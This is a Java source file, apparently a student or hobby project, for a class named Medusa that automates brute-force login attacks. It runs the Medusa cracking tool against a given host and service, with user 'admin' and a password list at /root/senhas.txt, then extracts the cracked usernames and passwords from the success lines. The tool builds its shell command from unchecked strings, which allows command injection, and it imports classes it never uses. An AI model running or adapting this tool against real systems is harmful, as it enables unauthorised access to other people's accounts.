package forcaBruta;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;

import org.omg.CORBA.RepositoryIdHelper;
import org.openqa.selenium.remote.RemoteWebDriver.When;

public class Medusa {

	private BufferedReader resposta;
	private String endereco;
	private String tipo;
	private List<String> usuarioeSenha =  new ArrayList<String>();
	
	public Medusa(String endereco,String tipo)
	{
		this.endereco = endereco;
		this.tipo = tipo;
		this.usuarioeSenha =  new ArrayList<String>();
	}
	
	public void executaForcaBruta()
	{
		String comando = "medusa -h "+endereco+" -u admin -P /root/senhas.txt -M "+tipo;
		Process processo;
		try {
			processo = Runtime.getRuntime().exec(comando);
			processo.waitFor();
			resposta = new BufferedReader(new InputStreamReader(processo.getInputStream()));
			
			
			
			String linha;
			while ((linha= resposta.readLine())!=null) {
				formataResposta(linha);
				
			}
			
		} catch (Exception e) {
			JOptionPane.showMessageDialog(null, "Erro ao executar força bruta");
		}
	
	
	}

	public List<String> getResposta() {
		return usuarioeSenha;
	}

	
	private void formataResposta(String linha){
				if(linha.contains("[SUCCESS]")){
					usuarioeSenha.add(getPalavra(linha,"User"));
					usuarioeSenha.add(getPalavra(linha,"Password"));
				}		
	
	}
	
	
	private String getPalavra(String linha, String parametro){
		int indiceUsuario = linha.indexOf(parametro);
		String palavra= "";
		boolean comecou=false;
		for (int i = indiceUsuario; i < linha.length(); i++) {
			if(comecou && linha.charAt(i)!=' '){
				palavra += linha.charAt(i);
			}
				
			if(linha.charAt(i)==' '){
				if(!comecou)
					comecou = true;
				else{
					comecou = false;
					return palavra;
				}
						
			}
		}		
		
		return null;
	}
		
	
}
